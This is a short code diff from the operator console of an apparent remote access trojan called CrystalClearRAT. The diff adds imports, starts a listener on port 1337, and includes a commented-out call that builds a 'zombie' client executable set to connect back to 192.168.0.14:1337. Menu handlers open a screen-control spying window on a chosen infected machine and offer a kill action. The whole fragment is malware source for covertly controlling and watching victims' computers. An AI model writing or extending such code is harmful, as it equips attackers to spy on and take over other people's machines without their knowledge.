@@ -25,6 +25,12 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using Mono.Cecil;
+using CrystalClearRAT.Properties;
+using CrystalRATShared.Helper;
+using System.IO;
+using Newtonsoft.Json;
+using CrystalClearRAT.Helper;
 
 namespace CrystalClearRAT
 {
@@ -53,6 +59,7 @@ namespace CrystalClearRAT
 
         private void Grid_Loaded(object sender, RoutedEventArgs e)
         {
+            //  ZombieBuilder.Build(new ClientSettings("192.168.0.14", 1337), "zombieWithSettings.exe");
             Server.Start(1337);
 
         }
@@ -90,7 +97,7 @@ namespace CrystalClearRAT
 
         private void SpyMonitorItem_Click(object sender, RoutedEventArgs e)
         {
-             new ScreenControlWindow(GetZombieFromMenuItem(sender)).Show();
+            new ScreenControlWindow(GetZombieFromMenuItem(sender)).Show();
         }
 
         private void KillItem_Click(object sender, RoutedEventArgs e)
